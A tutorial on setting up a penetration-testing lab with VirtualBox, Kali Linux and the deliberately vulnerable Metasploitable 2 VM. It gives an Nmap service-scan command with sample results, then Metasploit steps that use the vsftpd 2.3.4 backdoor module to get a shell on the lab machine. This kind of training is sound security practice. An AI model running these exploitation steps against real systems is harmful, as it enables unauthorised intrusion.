# Set Up Penetration Lab

## Objective

Setting up a penetration testing lab is essential for practicing and improving your cybersecurity skills in a safe and controlled environment. This tutorial will guide you through creating a virtual lab using VirtualBox, Kali Linux (for offensive security), and a vulnerable virtual machine (VM) like Metasploitable 2.

### Skills Learned

- Virtual Networking Configuration: Understanding how to set up and configure isolated network environments (e.g., host-only, NAT) to securely connect VMs within a penetration testing lab.
  
- Operating System Installation and VM Management: Gaining hands-on experience in installing and managing virtual machines (VMs), such as configuring Kali Linux and Metasploitable 2 for security testing.

- Service and Port Scanning: Learning to use tools like Nmap to scan for open ports and services on target VMs, gathering essential information for vulnerability assessments.

- Exploit and Vulnerability Analysis: Understanding how to identify and exploit known vulnerabilities in services (e.g., FTP, SSH) using tools like Metasploit, which aids in assessing system weaknesses.

- Safe Practice of Offensive Security Techniques: Acquiring skills to safely execute offensive security techniques within a controlled lab environment, reducing risks to production environments. 

### Tools Used

- Virtualization Software (VirtualBox or VMware): Used to create and manage the Kali Linux and Metasploitable 2 virtual machines on a single host system.

- Kali Linux: A penetration testing OS preloaded with security tools like Metasploit, Nmap, and Wireshark, providing a complete environment for vulnerability testing.

- Metasploitable 2: A deliberately vulnerable virtual machine for practicing scanning, exploitation, and vulnerability analysis in a controlled lab setup.

A basic network setup includes:
- Kali Linux VM: Offensive security testing machine.
- Metasploitable 2 VM: Deliberately vulnerable virtual machine for testing.
- Host-only Network**: Allows VMs to communicate with each other and the host machine without external network access.

Hereâ€™s a basic visual representation:

1. Kali Linux VM
2. Metasploitable 2 VM
3. Host-Only Network (192.168.x.x)

---

 2. Documenting the Nmap Scan Results

On the Kali Linux VM, you can run an Nmap scan to identify open ports and services on the Metasploitable 2 VM.

 Nmap Command

```bash
nmap -sV -A 192.168.x.y
```

- `-sV`: Detects version info for services.
- `-A`: Enables OS detection, script scanning, and traceroute.
- Replace `192.168.x.y` with the IP of the Metasploitable 2 VM.


| Port | State | Service         | Version            |
|------|-------|-----------------|--------------------|
| 21   | open  | ftp             | vsftpd 2.3.4      |
| 22   | open  | ssh             | OpenSSH 4.7p1     |
| 23   | open  | telnet          | -                 |
| 25   | open  | smtp            | Postfix smtpd     |
| 80   | open  | http            | Apache 2.2.8      |
| 3306 | open  | mysql           | MySQL 5.0.51a     |
| 5432 | open  | postgresql      | PostgreSQL DB     |
| 8180 | open  | http-alt        | Apache Jserv 1.3  |




3. Exploitation Steps**

Using vsftpd 2.3.4 which is a known vulnerability in Metasploitable 2:

1. Search for Exploits in Metasploit
   ```bash
   msfconsole
   ```
   ```bash
   search vsftpd
   ```

2. Select the Exploit Module
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. Set the Target Host
   ```bash
   set RHOSTS 192.168.x.y
   ```

4. Run the Exploit**
   ```bash
   exploit
   ```

5. Gain Access**
   After running the exploit, you may gain a shell on the target machine.
